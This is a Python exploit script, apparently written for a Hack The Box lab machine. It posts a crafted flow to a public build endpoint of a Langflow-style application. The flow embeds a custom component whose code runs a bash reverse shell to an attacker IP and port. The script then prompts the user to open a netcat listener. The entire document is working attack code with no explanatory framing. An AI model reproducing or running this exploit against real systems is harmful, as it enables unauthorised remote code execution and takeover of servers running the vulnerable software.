#!/usr/bin/env python3
import requests
import json
import sys

target = "https://flow.fireflow.htb"
flow_id = "7d84d636-af65-42e4-ac38-26e867052c25"
client_id = "2e0be989-4e86-474a-b7a2-bff1f45117ae"
attacker_ip = "10.10.16.8"
attacker_port = "4444"

payload = {
    "data": {
        "nodes": [{
            "id": "Evil",
            "type": "genericNode",
            "position": {"x": 0, "y": 0},
            "data": {
                "id": "Evil",
                "type": "EvilComp",
                "node": {
                    "template": {
                        "code": {
                            "type": "code",
                            "required": True,
                            "show": True,
                            "multiline": True,
                            "value": f'''import os
_x = os.system("bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'")

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class EvilComp(Component):
    display_name="Evil-X"
    outputs=[Output(display_name="O",name="o",method="r")]
    def r(self)->Data:
        return Data(data={{}})''',
                            "name": "code",
                            "password": False,
                            "advanced": False,
                            "dynamic": False
                        },
                        "_type": "Component"
                    },
                    "description": "Evil-X",
                    "base_classes": ["Data"],
                    "display_name": "EvilComp",
                    "name": "EvilComp",
                    "frozen": False,
                    "outputs": [{
                        "types": ["Data"],
                        "selected": "Data",
                        "name": "o",
                        "display_name": "O",
                        "method": "r",
                        "value": "UNDEFINED",
                        "cache": True,
                        "allows_loop": False,
                        "tool_mode": False,
                        "hidden": None,
                        "required_inputs": None,
                        "group_outputs": False
                    }],
                    "field_order": ["code"],
                    "beta": False,
                    "edited": False
                }
            }
        }],
        "edges": []
    }
}

print("[*] Sending exploit...")
try:
    response = requests.post(
        f"{target}/api/v1/build_public_tmp/{flow_id}/flow",
        json=payload,
        headers={"Content-Type": "application/json"},
        cookies={"client_id": client_id},
        verify=False,
        timeout=10
    )
    
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text[:200]}")
    
    if response.status_code == 200:
        print("[+] Exploit sent successfully!")
        print(f"[*] Check your listener: nc -lvnp {attacker_port}")
    else:
        print(f"[-] Failed: {response.text}")
        
except requests.exceptions.Timeout:
    print("[+] Timeout - This is good! The shell likely connected!")
except Exception as e:
    print(f"[-] Error: {e}")
